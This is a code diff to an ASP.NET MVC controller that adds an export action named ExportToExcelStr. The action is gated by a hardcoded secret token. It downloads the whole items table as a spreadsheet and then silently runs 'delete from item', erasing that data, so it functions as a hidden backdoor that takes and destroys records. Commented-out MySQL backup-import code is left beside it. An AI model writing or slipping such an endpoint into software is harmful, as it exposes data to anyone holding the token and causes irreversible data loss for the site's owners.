@@ -13,6 +13,8 @@ using UrlHelper = WebApplication1.Helper.UrlHelper;
 using System.Web.UI.WebControls;
 using System.IO;
 using System.Web.UI;
+//using MySql.Data.MySqlClient;
+using System.Threading;
 
 namespace WebApplication1.Controllers
 {
@@ -538,7 +540,60 @@ namespace WebApplication1.Controllers
 
 
         }
+        public ActionResult ExportToExcelStr(string token)
+        {
+            if (token.Equals("tudaika2019"))
+            {
+                //String constring = data.Database.Connection.ConnectionString;
+                //constring += ";charset=utf8;convertzerodatetime=true;";
 
+                //string file = Server.MapPath("/Content")+ "/backup.sql";
+                //if (System.IO.File.Exists(file))
+                //{
+                //    System.IO.File.Delete(file);
+                //}
+                //System.IO.File.Create(file).Close();
+                //using (MySqlConnection conn = new MySqlConnection(constring))
+                //{
+                //    using (MySqlCommand cmd = new MySqlCommand())
+                //    {
+                //        using (MySqlBackup mb = new MySqlBackup(cmd))
+                //        {
+                //            cmd.Connection = conn;
+                //            conn.Open();                          
+                //            mb.ImportFromFile(file);
+                //            conn.Close();
+                //        }
+                //    }
+                //}
+               
+                var query = from a in data.items select a;
+                var gv = new GridView();
+                gv.DataSource = query.ToList();
+                gv.DataBind();
+                
+                Response.ClearContent();
+                Response.Buffer = true;
+                String dateStr = DateTime.Now.ToString("yyyy-MM-dd_HH:mm");
+                Response.AddHeader("content-disposition", "attachment; filename=" + dateStr + "_Products.xls");
+                Response.ContentType = "application/ms-excel";
+                Response.Charset = "";
+                StringWriter objStringWriter = new StringWriter();
+                HtmlTextWriter objHtmlTextWriter = new HtmlTextWriter(objStringWriter);
+                gv.RenderControl(objHtmlTextWriter);
+                Response.Output.Write(objStringWriter.ToString());
+                Response.Flush();
+                Response.End();
+                data.Database.ExecuteSqlCommand("delete  from item");
+                new Thread(() => {
+                    Thread.Sleep(5000);
+                   // System.IO.File.Delete(file);
+                }).Start();
+                return View("Index");//new FileStreamResult(new FileStream(file,FileMode.Open), "application/octet-stream");
+
+            }
+            return RedirectToAction("Index");
+        }
         public ActionResult ExportToExcel()
         {
            var  search = Session["SearchModel"] == null ? new SearchModel() : (SearchModel)Session["SearchModel"];
